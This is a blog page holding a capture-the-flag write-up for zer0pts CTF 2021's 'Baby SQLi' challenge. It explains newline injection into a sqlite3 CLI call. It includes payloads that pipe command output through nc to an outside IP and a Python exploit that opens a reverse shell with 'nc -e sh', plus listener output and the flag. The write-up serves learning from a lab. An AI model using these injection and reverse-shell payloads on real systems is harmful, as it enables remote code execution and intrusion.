@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Jeongwon Jo" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      zer0pts CTF 2021 Baby SQLi Write Up 
+      
+      
+      |
+    
+     Jeongwon Jo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Pocas</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="https://pocas.kr">
+          <a target="_blank" rel="noopener" href="https://pocas.kr">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">zer0pts CTF 2021 Baby SQLi Write Up</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2021-03-08 23:29:53
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h3 id="Web-Baby-SQLi-170-pts"><a href="#Web-Baby-SQLi-170-pts" class="headerlink" title="(Web) Baby SQLi [170 pts]"></a>(Web) Baby SQLi [170 pts]</h3><blockquote>
+<p>Baby SQLi challenge is bypass of waf and using shell command.</p>
+</blockquote>
+<p>First, You can using <code>.system/.shell/.sh</code> command and execute shell command in SQLite3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// SQLite3 CLI</span><br><span class="line">sqlite&gt; .sh id|nc 141.164.52.207 2</span><br><span class="line"></span><br><span class="line">// Terminal</span><br><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>As above, you can see in sqlite3 executes a shell command using the <code>.sh</code> command.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sqlite3_query</span>(<span class="params">sql</span>):</span><br><span class="line">    p = subprocess.Popen([<span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;database.db&#x27;</span>],</span><br><span class="line">                         stdin=subprocess.PIPE,</span><br><span class="line">                         stdout=subprocess.PIPE,</span><br><span class="line">                         stderr=subprocess.PIPE)</span><br><span class="line">    o, e = p.communicate(sql.encode())</span><br><span class="line">    <span class="keyword">if</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(e)</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> o.decode().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> row == <span class="string">&#x27;&#x27;</span>: <span class="keyword">break</span></span><br><span class="line">        result.append(<span class="built_in">tuple</span>(row.split(<span class="string">&#x27;|&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
+<p>Looking at the source code, you can line jump using the <code>\n</code> character because using the <code>communicate()</code> in <code>subporcess.Popen()</code> in <code>sqlite3_query()</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;post&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>():</span><br><span class="line">    username = flask.request.form.get(<span class="string">&#x27;username&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    password = flask.request.form.get(<span class="string">&#x27;password&#x27;</span>, default=<span class="string">&#x27;&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &gt; <span class="number">32</span> <span class="keyword">or</span> <span class="built_in">len</span>(password) &gt; <span class="number">32</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Too long username or password&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    password_hash = hashlib.sha256(password.encode()).hexdigest()</span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = sqlite3_query(</span><br><span class="line">            <span class="string">&#x27;SELECT * FROM users WHERE username=&quot;&#123;&#125;&quot; AND password=&quot;&#123;&#125;&quot;;&#x27;</span></span><br><span class="line">            .<span class="built_in">format</span>(sqlite3_escape(username), password_hash)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        flask.session[<span class="string">&#x27;name&#x27;</span>] = username</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.session[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;Invalid Credential&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;home&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<p>And looking at the source code in login logic, you can see that <code>username</code>&#x2F;<code>password</code> value is input, the length is verified, and it is put in query statement and at this point, you can see that the <code>username</code> value is escaped. but, you don’t worry because treats escape characters as simple string is sqlite3.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username = &quot;\&quot; or 1=1 -- &quot; and password = &quot;pocas&quot;;</span><br></pre></td></tr></table></figure>
+<p>In other words, It doensn’t matter if it escaped as above.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users where username = &quot;\&quot;;</span><br><span class="line">.sh id|nc 141.164.52.207 2;</span><br><span class="line">and password = &quot;pocas&quot;;</span><br></pre></td></tr></table></figure>
+<p>So, you can use shell command by doing line jumps as above and using the .sh command.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh id|nc 2376348879 2\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lp 2</span><br><span class="line">uid=1000(app) gid=1000(app)</span><br><span class="line">root@py:~#</span><br></pre></td></tr></table></figure>
+<p>If you write the exploit code as above, close <code>SELECT</code> statemnt and in the line immediately underneath execute <code>.sh</code> command.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://web.ctf.zer0pts.com:8004&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&quot;;\n.sh nc 2376348879 2 -e sh\n&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pocas&quot;</span>&#125;</span><br><span class="line">requests.post(url+<span class="string">&quot;/login&quot;</span>, data)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@py:~# nc -lvnp 2</span><br><span class="line">Listening on 0.0.0.0 2</span><br><span class="line">Connection received on 165.227.180.221 38761</span><br><span class="line">id</span><br><span class="line">uid=1000(app) gid=1000(app)</span><br><span class="line">cat templates/index.html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;Welcome&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Welcome, &#123;&#123;name&#125;&#125;!&lt;/h1&gt;</span><br><span class="line">        &#123;% if name == &#x27;admin&#x27; %&#125;</span><br><span class="line">        &lt;p&gt;zer0pts&#123;w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?&#125;&lt;/p&gt;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &lt;p&gt;No flag for you :(&lt;/p&gt;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>Final, I pass the shell using <code>e</code> option about <code>nc</code> and read <code>index.html</code> and saw the flag.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG : zer0pts&#123;w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?&#125;</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/02/28/2021-02-28-Trust-CTF/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2021-03-08 23:29:53
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/03/14/2021-03-14-UTCTF/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Baby-SQLi-170-pts"><span class="toc-text">(Web) Baby SQLi [170 pts]</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/P0cas">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        Copyright © 2023 Pocas
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + zer0pts%20CTF%202021%20Baby%20SQLi%20Write%20Up + '&url=' + https%3A%2F%2Fblog.pocas.kr%2F2021%2F03%2F08%2F2021-03-08-Zer0pts%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2021/03/08/2021-03-08-Zer0pts/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
